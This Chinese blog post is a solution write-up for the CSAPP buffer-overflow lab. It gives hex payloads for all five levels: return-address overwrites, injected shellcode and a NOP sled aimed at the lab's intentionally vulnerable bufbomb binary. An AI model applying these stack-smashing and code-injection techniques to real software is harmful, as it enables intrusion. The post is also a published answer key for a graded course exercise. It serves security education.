---
layout: post
title: "CSAPP: Buf Lab"
date: 2014-02-07 23:30
comments: true
categories: ComputerSystem
---

这是CSAPP的buflab，非常有意思，难度又比之前的bomb-lab要小很多。程序有一个命令行选项-u要求我们输入一个唯一的userid，根据不同的userid生成不同的cookie值，这个cookie值之后在程序里一直会用到，所以每个人的答案应该都会不同。我用的userid是`zjs`。
<!-- more -->
这个lab要我们做这样一件事情，修改一个正在运行程序的stack以达到预期的目的。具体的修改方式是这样的：程序定义了一个局部C风格字符串变量，注意局部变量是放在stack上面的，所以当初始化这个字符串为用户输入，而又没有边界检查的话，就会缓冲区溢出，那么就会破坏这个函数栈。

就像下面这个函数会破坏自己的函数栈：
	
	#define NORMAL_BUFF_SIZE 32
	
	int getbuf()
	{
		char buf[NORMAL_BUFF_SIZE];
		Gets(buf);
		return 1;
	}
	
会破坏到什么程度呢？如果用户输入太大，那么就把`saved ebp`给覆盖掉了；再大一点，就把`return address`覆盖掉了...没错，这个lab的精髓就是要让我们的输入来覆盖`return address`达到return到代码的其它地方执行。

## Some Tools
在做这个实验的时候，需要了解以下一些命令：

1.	objdump -d xxx //反汇编
2.	gcc -m32 -c xxx.s	//将汇编文件xxx.s生成IA32的relocatable object file，再用反汇编就知道xxx.s中汇编代码的二进制编码

## 第0关：smoke
我们的目标是调用上面的`getbuf`以后，不正常返回，而是跳掉smoke这个函数的地方执行。

很简单，就是先填充掉32字节本身的变量空间，然后4个字节重写掉`saved ebp`，再用4个字节重写掉`return address`，需要把`return address`替换为smoke的函数起始地址。我这里看到的smoke起始地址是`0x8048d83`，编码用的是小端规则，所以答案是：

	00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00
	00 00 00 00 83 8d 04 08

需要注意的是，这里覆盖掉了`saved ebp`，所以离开程序smoke以后`ebp`就错了，好在smoke直接调exit了，所以暂时不需要考虑这个问题。

实验还提供了一个工具把上面的二进制答案转化为程序输入的字节流，所以完整的命令行是：

	cat answer0 | ./hex2raw | ./bufbomb -u zjs
		
## 第1关：Sparkler
这一关和第0关类似，这次要跳到`fizz`这个函数的地方并且顺利运行。
代码里有两句是：
	
	mov 0x8(%ebp),%eax
	cmp 0x804c1e4,%eax
	
想想会发现`0x8(%ebp)`这个值正好是我们输入return address之后的几个字节，而`0x804c1e4`保存着cookie的值，所以我们用gdb把`0x804c1e4`地址的值找到，把这个值加在我们第一题的答案后面就好了，还要把`return address`换成fizz的地址。

	00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 38 8d 04 08
    00 00 00 00 d4 9f c2 50

## 第2关：Firecracker
这关比较有意思，在bang这个函数中，程序需要`0x804c1e4`和`0x804c1ec`存的值相同。`0x804c1e4`存的是cookie，但没有一处对`0x804c1ec`这个地址赋值。

我们需要做的，是自己写一段代码，给`0x804c1ec`赋值，然后让程序来执行。怎么对一个已经编译好的可执行文件做到这一点呢，既然可以修改`return address`，那就让它跳到局部字符串的地址，而局部字符串里存的就是我们的指令代码。

我们首先需要编写下面的代码asm2.s

	mov 0x804c1e4,%eax
    mov %eax,0x804c1ec	// *(0x804c1ec) = *(0x804c1e4)
    push $0x8048ceb		// jmp address
    ret

对它进行汇编：

	gcc -m32 -c asm2.s
	
生成asm2.o文件，然后反汇编生成二进制代码：

	objdump -d asm2.o
	
之后把这些代码复制到我们的答案里就可以了，当然这个需要把`return address`改为字符串的起始地址，这在栈空间里面，用gdb命令`p $ebp - 0x20`就可以查到，在我这里是`0x556836e0`。

这一关的答案为
<pre><code>
a1 e4 c1 04 08 a3 ec c1
04 08 68 eb 8c 04 08 c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 e0 36 68 55
</code></pre>

## 第3关：Dynamite
和上一关类似，需要自己写汇编代码让程序执行。

这一关的目的是让getbuf返回cookie值给test而不是1。我用了一种比较tricky的方法过了这关，返回cookie的目的无非是想让下面这段代码通过：

<pre><code>
8048ddd:   3b 1d e4 c1 04 08       cmp    0x804c1e4,%ebx
8048de3:   75 1e                   jne    8048e03 <test+0x56>
8048de5:   89 5c 24 04             mov    %ebx,0x4(%esp)
8048de9:   c7 04 24 76 a0 04 08    movl   $0x804a076,(%esp)
8048df0:   e8 4f fb ff ff          call   8048944 <printf@plt>
8048df5:   c7 04 24 03 00 00 00    movl   $0x3,(%esp)
8048dfc:   e8 7f 03 00 00          call   8049180 <validate>
</code></pre>

所以如果我直接让程序ret到`0x8048de5`就可以了。
汇编代码：

	push $0x8048de5	ret答案为
<pre><code>
68 e5 8d 04 08 c3 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 e0 36 68 55
</code></pre>

到这里，我们可以思考一下，我们究竟干了什么。我们让一个程序执行了我们自己设计的代码并且程序毫不知情！

## 第4关：Nitroglycerin
这一关难度比前面都大。进入这一关需要加入-n选项，调的函数是testn和getbufn，而不是前面的test和getbuf。前面所有函数调用的栈地址都是固定的，静态的。在这一关栈的地址将不固定，也就是说不能准确地跳转到栈空间的某个特定地址，因为我们不知道局部变量的初始化地址在哪。这道题有5个test case，要都同过才算过，所以好像不能写死跳转地址了。

在这一关buffersize也从32增大到了512，这个做法是有意义的。大概的思路是，虽然栈的初始地址不同，但会在一些范围里浮动，所以我们需要把我们的代码填在512字节的最后几个字节里，并且前面全面的空间都填上nop(编码为`90`)。不管我们跳转到哪个nop，最后都会执行到我们的代码。用gdb观察5个case分别的`ebp - 0x200`的值，我们取最大的值作为跳转地址。
在我这里最大的地址是`0x55683570`。

因为要执行5遍，所以我们必须考虑覆盖`saved ebp`这个问题，否则程序不能正确运行。查看testn的ebp值和getbufn的ebp值，发现它们的差值总是`0x30`，所以当我们返回testn的时候，$esp+0x28 就应该是此时ebp正确的值。

所以我们的汇编代码为：
<pre><code>
lea 0x28(%esp), %ebp
mov 0x804c1e4, %eax
push $0x8048c93
ret
</code></pre>

第二行代码的目的是因为跳转到`0x8048c93`后，eax的值需要和cookie比较，相等才能通过。

所以答案为：
<pre><code>
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 8d 6c 24 28
a1 e4 c1 04 08 68 93 8c 04 08 c3 90 90 90 90 90
00 00 00 00 70 35 68 55 
</code></pre>
注意最后一行最后4个字节为跳转地址。

这一关的运行代码为：

	cat answer4 | ./hex2raw -n | ./bufbomb -u zjs -n

至此，5关就全通了。
